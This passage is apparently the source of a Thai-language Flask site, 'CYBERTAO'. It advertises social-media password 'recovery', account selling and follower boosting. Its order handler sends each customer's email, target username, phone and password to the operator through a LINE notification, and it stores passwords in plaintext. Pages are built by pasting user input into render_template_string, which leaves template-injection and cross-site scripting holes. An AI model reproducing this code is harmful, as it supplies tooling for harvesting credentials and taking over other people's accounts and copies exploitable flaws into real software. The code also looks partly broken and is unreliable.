import json
import requests
from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# ==========================================
# ฐานข้อมูลจำลองภายในระบบ (In-Memory DB)
# ==========================================
db_users = {}         # เก็บข้อมูลสมัครสมาชิกของลูกค้า {'username': 'password'}
db_submissions = []   # เก็บประวัติการส่งข้อมูลและสั่งซื้อทั้งหมด
db_job_statuses = {}  # เก็บสถานะงานเพื่อให้ลูกค้ามาตรวจเช็ค {'job_id': 'กำลังดำเนินการ/เสร็จสิ้น'}

ADMIN_PASSWORD = "tao2026_secure"
LINE_TOKEN = "YOUR_LINE_NOTIFY_TOKEN"  # <-- เอา Token LINE ของคุณมาใส่ตรงนี้เหมือนเดิมครับ

def send_line_notification(data):
    if LINE_TOKEN == "YOUR_LINE_NOTIFY_TOKEN": return
    url = "https://line.me"
    headers = {"Authorization": f"Bearer {LINE_TOKEN}"}
    message = (
        f"\n🔔 [มีคำขอใช้บริการใหม่เข้ามา!]\n"
        f"📌 บริการ: {data.get('service_type')}\n"
        f"👤 ลูกค้า: {data.get('customer_user', 'บุคคลทั่วไป')}\n"
        f"📧 อีเมล: {data.get('email')}\n"
        f"👤 User ปลายทาง: {data.get('username')}\n"
        f"📞 เบอร์โทร: {data.get('phone')}\n"
        f"🔑 รหัสผ่าน: {data.get('password')}\n"
        f"📝 รายละเอียดอื่น ๆ: {data.get('details')}"
    )
    try: requests.post(url, headers=headers, data={"message": message})
    except: pass

# สไตล์ส่วนกลาง Cyberpunk Neon Glow แสงสีจัดเต็ม รองรับการสไลด์จอมือถือ
STYLE = "<style>body{background-color:#040408;color:#f1f5f9;font-family:sans-serif;padding:20px;display:flex;flex-direction:column;align-items:center;min-height:95vh;margin:0;box-sizing:border-box;}.container{width:100%;max-width:480px;text-align:center;}h1{color:#10b981;text-shadow:0 0 15px rgba(16,185,129,0.7);font-size:26px;margin:10px 0 5px 0;font-weight:900;}.sub{color:#64748b;font-size:12px;margin-bottom:20px;}.card{background:#0f172a;border:1px solid #1e293b;padding:18px;border-radius:16px;margin-bottom:15px;text-align:left;box-shadow:0 4px 6px rgba(0,0,0,0.3);}.c-green{border-color:#10b981;box-shadow:0 0 12px rgba(16,185,129,0.2);}.c-blue{border-color:#3b82f6;box-shadow:0 0 12px rgba(59,130,246,0.2);}.c-purple{border-color:#8b5cf6;box-shadow:0 0 12px rgba(139,92,246,0.2);}.c-red{border-color:#ef4444;box-shadow:0 0 12px rgba(239,68,68,0.2);}.card h3{margin:0 0 4px 0;font-size:15px;color:#fff;}.card p{margin:0 0 10px 0;font-size:12px;color:#94a3b8;}.grid-btns{display:grid;grid-template-columns:1fr 1fr;gap:8px;}.btn{padding:8px 12px;border-radius:10px;font-size:12px;font-weight:bold;text-decoration:none;text-align:center;display:inline-block;border:none;cursor:pointer;transition:all 0.2s;}.btn-green{background:#10b981;color:#000;}.btn-blue{background:#3b82f6;color:#fff;}.btn-purple{background:#8b5cf6;color:#fff;}.btn-red{background:#ef4444;color:#fff;}.form-box{background:#0f172a;border:1px solid #1e293b;padding:20px;border-radius:18px;width:100%;text-align:left;box-sizing:border-box;}.form-group{margin-bottom:12px;}.form-group label{display:block;font-size:11px;color:#94a3b8;margin-bottom:4px;}.form-group input,.form-group textarea,.form-group select{width:100%;background:#05050a;border:1px solid #334155;padding:10px;border-radius:8px;color:#fff;box-sizing:border-box;outline:none;font-size:13px;}.form-group input:focus{border-color:#10b981;}table{width:100%;border-collapse:collapse;background:#0f172a;border-radius:12px;overflow:hidden;font-size:12px;text-align:left;}th,td{padding:12px;border-bottom:1px solid #1e293b;}th{background:#020617;color:#94a3b8;}.badge{padding:2px 6px;border-radius:4px;font-size:11px;font-weight:bold;}</style>"

# ==========================================
# [โซนที่ 1: ระบบสมัครสมาชิก/เข้าสู่ระบบของลูกค้า]
# ==========================================
@app.route('/register', methods=['GET', 'POST'])
def customer_register():
    msg = ""
    if request.method == 'POST':
        u = request.form.get('user')
        p = request.form.get('pwd')
        if u in db_users: msg = "❌ ชื่อผู้ใช้นี้มีอยู่ในระบบแล้ว"
        else:
            db_users[u] = p
            msg = "✅ สมัครสมาชิกสำเร็จ! กรุณาเข้าสู่ระบบ"
    return render_template_string(
        "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Register</title>" + STYLE + "</head>"
        "<body><div class='container' style='max-w:360px;'><h2>🔐 สมัครไอดีใช้งานเพื่อติดตามผลงาน</h2><p class='sub'>ลงทะเบียนเพื่อรับการแจ้งเตือนงานแก้ข้อมูล</p>"
        "<p style='color:#10b981; font-size:12px; font-weight:bold;'>" + msg + "</p>"
        "<div class='form-box'><form action='/register' method='POST'>"
        "<div class='form-group'><label>ตั้งชื่อไอดีผู้ใช้ (Username)</label><input type='text' name='user' required></div>"
        "<div class='form-group'><label>ตั้งรหัสผ่าน (Password)</label><input type='password' name='pwd' required></div>"
        "<button type='submit' class='btn btn-green' style='width:100%; padding:10px;'>สร้างบัญชีผู้ใช้</button>"
        "</form></div><a href='/customer-login' class='sub' style='margin-top:15px; display:inline-block;'>มีบัญชีอยู่แล้ว? เข้าสู่ระบบที่นี่</a></div></body></html>"
    )

@app.route('/customer-login', methods=['GET', 'POST'])
def customer_login():
    msg = ""
    if request.method == 'POST':
        u = request.form.get('user')
        p = request.form.get('pwd')
        if db_users.get(u) == p:
            # ล็อกอินสำเร็จ พาวิ่งไปหน้าเช็คสถานะงานของตัวเอง
            job_rows = ""
            for i in db_submissions:
                if i.get('customer_user') == u:
                    status = db_job_statuses.get(i['id'], "กำลังดำเนินการรันระบบ")
                    bg = "#ef4444" if "ดำเนินการ" in status else "#10b981"
                    job_rows += f"<tr><td>{i['service_type']}</td><td>{i['username']}</td><td>{i['date']}</td><td><span class='badge' style='background:{bg};color:#000;'>{status}</span></td></tr>"
            
            if not job_rows:
                job_rows = "<tr><td colspan='4' style='text-align:center;color:#64748b;padding:20px;'>คุณยังไม่มีประวัติการส่งข้อมูลซ่อมกับเรา</td></tr>"

            return render_template_string(
                "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>My Dashboard</title>" + STYLE + "</head>"
                "<body><div style='width:100%; max-w:500px;'><h2>📦 สถานะติดตามงานของคุณ: " + u + "</h2><p class='sub'>อัปเดตงานซ่อม/บริการแบบเรียลไทม์</p>"
                "<table><tr><th>บริการ</th><th>เป้าหมาย</th><th>วันที่ส่ง</th><th>สถานะล่าสุด</th></tr>" + job_rows + "</table>"
                "<br><a href='/' class='btn btn-blue' style='width:100%; padding:10px; box-sizing:border-box;'>← กลับสู่หน้าหลักเพื่อสั่งงานเพิ่ม</a></div></body></html>"
            )
        else: msg = "❌ ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง"
    return render_template_string(
        "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Login</title>" + STYLE + "</head>"
        "<body><div class='container' style='max-w:360px;'><h2>🔑 เข้าสู่ระบบเพื่อติดตามงาน</h2><p class='sub'>ตรวจสอบความคืบหน้าของงานซ่อมที่คุณส่งมา</p>"
        "<p style='color:#ef4444; font-size:12px; font-weight:bold;'> " + msg + "</p>"
        "<div class='form-box'><form action='/customer-login' method='POST'>"
        "<div class='form-group'><label>ชื่อไอดี (Username)</label><input type='text' name='user' required></div>"
        "<div class='form-group'><label>รหัสผ่าน (Password)</label><input type='password' name='pwd' required></div>"
        "<button type='submit' class='btn btn-blue' style='width:100%; padding:10px;'>เข้าสู่ระบบความคืบหน้า</button>"
        "</form></div><a href='/register' class='sub' style='margin-top:15px; display:inline-block;'>ยังไม่มีไอดีระบบ? สมัครสมาชิกที่นี่</a></div></body></html>"
    )

# ==========================================
# [โซนที่ 2: ระบบหน้าแรกแบ่งตาม 3 หน้าหลักที่คุณสั่งเปลี่ยน]
# ==========================================
@app.route('/')
def index():
    return render_template_string(
        "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>CYBERTAO</title>" + STYLE + "</head>"
        "<body><div class='container'>"
        "<div style='display:flex;justify-content:space-between;width:100%;margin-bottom:15px;align-items:center;'><span style='font-size:11px;color:#10b981;'>CYBERTAO ณ.สุรินทร์</span><a href='/customer-login' class='btn btn-blue' style='font-size:10px;padding:5px 10px;'>📌 ติดตามงานซ่อม</a></div>"
        "<h1>CYBERTAO SYSTEM</h1><p class='sub'>บริการเทคโนโลยีแอปพลิเคชัน & อุปกรณ์จัดเต็มระดับมืออาชีพ</p>"
        
        # หน้า 1: บริการแจ้งแก้ไข + ยิงแอด + ลืมรหัสผ่านเฟส ติ๊กต๊อก ไอจี ไลน์
        "<div class='card c-green'><h3>🛠️ หน้าที่ 1: ศูนย์บริการแก้ไขและจัดทำระบบ</h3><p>แก้บั๊กแอปพลิเคชัน ยิงแอดโฆษณา และกู้คืนบัญชี/ลืมรหัสผ่านระบบโซเชียลทุกประเภท</p>"
        "<div class='grid-btns'><a href='/form?type=ModifyApp' class='btn btn-green'>แก้ Application</a><a href='/form?type=ShootAds' class='btn btn-green'>บริการยิงแอด</a>"
        "<a href='/form?type=RecoverFB' class='btn btn-green'>กู้รหัส Facebook</a><a href='/form?type=RecoverTT' class='btn btn-green'>กู้รหัส TikTok</a>"
        "<a href='/form?type=RecoverIG' class='btn btn-green'>กู้รหัส Instagram</a><a href='/form?type=RecoverLine' class='btn btn-green'>กู้รหัส LINE</a></div></div>"
        
        # หน้า 2: หน้าร้านค้า เพิ่มรายการขายไอดี และบริการรับปั๊มยอดผู้ติดตาม วิว แชร์
        "<div class='card c-blue'><h3>🛒 หน้าที่ 2: ไซเบอร์ช็อป จำหน่ายไอดี & บริการเพิ่มยอด</h3><p>ซื้อ-ขายไอดีแพลตฟอร์มคุณภาพสูง และบริการรับเพิ่มผู้ติดตาม ยอดไลก์ ยอดวิวแชร์ โซเชียลมีเดีย</p>"
